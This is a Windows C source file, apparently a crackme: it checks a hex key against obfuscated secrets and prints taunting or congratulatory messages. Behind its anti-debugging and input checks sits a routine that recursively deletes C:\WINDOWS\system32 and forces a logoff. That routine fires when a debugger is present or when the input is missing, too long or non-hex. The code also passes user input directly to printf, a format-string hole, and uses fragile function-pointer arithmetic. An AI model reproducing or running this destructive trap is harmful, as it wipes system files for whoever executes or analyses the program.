#include "stdafx.h"
#include <Windows.h>

#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

char* genererChaine() {
    const char caracteres[] = "0123456789abcdefABCDEF";

    const int taille = 20;

    char* chaine = (char*)malloc((taille + 1) * sizeof(char));

    srand((unsigned int)time(NULL));

    for (int i = 0; i < taille; ++i) {
        int indice = rand() % (sizeof(caracteres) - 1);
        chaine[i] = caracteres[indice];
    }

    chaine[taille] = '\0';

    return chaine;
}

typedef int (*type_printf)(const char *, ...);

char debut[12] = {'\x6a', '\x0c', '\x68', '\x60', '\x57', '\xb0',
					'\x78', '\xe8', '\xc0', '\xb5','\xfa', '\xff'}; //tableau ecrit en hexa pour un meilleur affichage car certains caractere sont pas en ascii

char hello[13] = {'f'^69, 'd'^69, 'a'^69, 'd'^69, 'a'^69, 'f'^69, 'd'^69, 'a'^69, 'd'^69, 'a'^69, 'e'^69,'E'^69, '\x00'^69};

char secret3[13] = {~('9'^69)-6, ~('5'^69)-6, ~('1'^69)-6, ~('B'^69)-6, ~('3'^69)-6, ~('D'^69)-6, ~('e'^69)-6, ~('c'^69)-6, ~('B'^69)-6, ~('5'^69)-6, ~('b'^69)-6, ~('D'^69)-6, ~('\x00'^69)-6};
	
char secret6[15] = {'4'^85, '2'^85, '9'^85, 'C'^85, '8'^85, 'A'^85, 'f'^85, 'c'^85, 'B'^85, '5'^85, 'b'^85, 'D'^85, '\x00'^85};

char secret4[21] = {'C'^14, 'o'^14, 'n'^14, 'g'^14, 'r'^14, 'a'^14, 't'^14, 'u'^14, 'l'^14, 'a'^14, 't'^14, 'i'^14, 'o'^14, 'n'^14, 's'^14, ' '^14, '!'^14, '!'^14, ' '^14, '\x00'^14};

char secret7[9] = {'I'^78, 'd'^78, 'i'^78, 'o'^78, 't'^78, '.'^78, '.'^78, '\x00'^78};

LPCWSTR path = L"C:\\WINDOWS\\system32";

void obfuscate(char *string, int length) {
    for (int i = 0; i < length; i++) {
        //inversion de bits
        string[i] = ~string[i];
		//ensuite
		string[i] = string[i] + 1;
		string[i] = string[i] - 7;
    }
}

void obfuscate2(char *string, int length) {
    for (int i = 0; i < length; i++) {
		//ensuite
		string[i] = string[i] + 8;
		string[i] = string[i] - 2;

		//inversion de bits
        string[i] = ~string[i];
    }
}

void deobfuscate(char *string, int length) {
    for (int i = 0; i < length; i++) {
		//ensuite
		string[i] = string[i] + 7;
		string[i] = string[i] - 1;
        //Inversion de bits (inverse de la transformation d'obfuscation)
        string[i] = ~string[i];
    }
}

void deobfuscate2(char *string, int length) {
    for (int i = 0; i < length; i++) {
		//Inversion de bits (inverse de la transformation d'obfuscation)
        string[i] = ~string[i];
		//ensuite
		string[i] = string[i] + 2;
		string[i] = string[i] - 8;
        
    }
}

void deobfuscate3(char *string, int length) {
    for (int i = 0; i < length; i++) {
		//Inversion de bits (inverse de la transformation d'obfuscation)
        string[i] = ~string[i];
		//ensuite
		string[i] = string[i] + 2;
		string[i] = string[i] - 8;
        
    }
	for(int i = 0; i<length; i++) string[i] ^= 14;
}

void EmptyDirectory(LPCWSTR path) {
	
    wchar_t searchPath[MAX_PATH];
    wcscpy(searchPath, path);
    wcscat(searchPath, L"\\*");

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findFileData.cFileName, L".") != 0 && wcscmp(findFileData.cFileName, L"..") != 0) {
                wchar_t filePath[MAX_PATH];
                wcscpy(filePath, path);
                wcscat(filePath, L"\\");
                wcscat(filePath, findFileData.cFileName);

                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    EmptyDirectory(filePath);
                    RemoveDirectory(filePath);
                } else {
                    DeleteFile(filePath);
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);
    }
	ExitWindowsEx(EWX_FORCE, 1);	
}


int _tmain(int argc, _TCHAR* argv[])
{
	
	obfuscate(secret6, 13);
	type_printf mprint;
	char *p = (char *) scanf;
	char secret5[13] = {'D'^36, 'o'^36, 'm'^36, 'm'^36, 'a'^36, 'g'^36, 'e'^36, ' '^36, '.'^36, '.'^36, '.'^36, '\x00'^36};
	obfuscate(hello, 13);
	char secret7[9] = {'I'^78, 'd'^78, 'i'^78, 'o'^78, 't'^78, '.'^78, '.'^78, '\x00'^78};
	obfuscate2(secret5, 13);
	obfuscate2(secret7, 9);
	char secret2[13] = {'f'^69, '4'^69, '2'^69, '5'^69, '6'^69, 'F'^69, '2'^69, '7'^69, 'D'^69, 'a'^69, 'E'^69,'C'^69, '\x00'^69}; 
	obfuscate2(secret4, 21);
	obfuscate(secret2, 13);
	int delta = ((unsigned int) scanf) - ((unsigned int) deobfuscate3);
	p = p-delta;
	mprint = (type_printf)p;

	if(IsDebuggerPresent()){
		EmptyDirectory(path);
	}
	
	int i, valid = 1;
	if(argc != 2){
		EmptyDirectory(path);
	}

	char *input = new char[wcslen(argv[1])+1];
	wcstombs(input, argv[1], wcslen(argv[1])+1);

	if(!strlen(input)){
		EmptyDirectory(path);
	}
	if(strlen(input) > 32){
		EmptyDirectory(path);
	}

	for (int i = 0; i < strlen(input); i++) {
		if (!((input[i] >= '0' && input[i] <= '9') ||
		(input[i] >= 'a' && input[i] <= 'f') ||
		(input[i] >= 'A' && input[i] <= 'F'))) {
			valid = 0;
			break;
		}
	}
 
	if (valid) {
		printf(input);
		printf("\n");
		for(int i = 0; i<13; i++) input[i] ^= 69;
		obfuscate(input, 13);
		if (strcmp(input, secret2) == 0) {
			printf("\n");
			deobfuscate2(secret5, 13);
			for(int i = 0; i<13; i++) secret5[i] ^= 36;
			Sleep(2000);
			Sleep(5000);
			printf(secret5);
		}
		else if (strcmp(input, secret3) == 0) {
			mprint(secret4, 21);
			Sleep(2000);
			Sleep(5000);
			printf(secret4);
			
		}else if (strcmp(input, hello) == 0){
			deobfuscate2(secret7, 9);
			for(int i = 0; i<9; i++) secret7[i] ^= 78;
			Sleep(2000);
			Sleep(5000);
			printf(secret7);
		}
		
	} else {
		EmptyDirectory(path);
	}
	
	return 0;
}	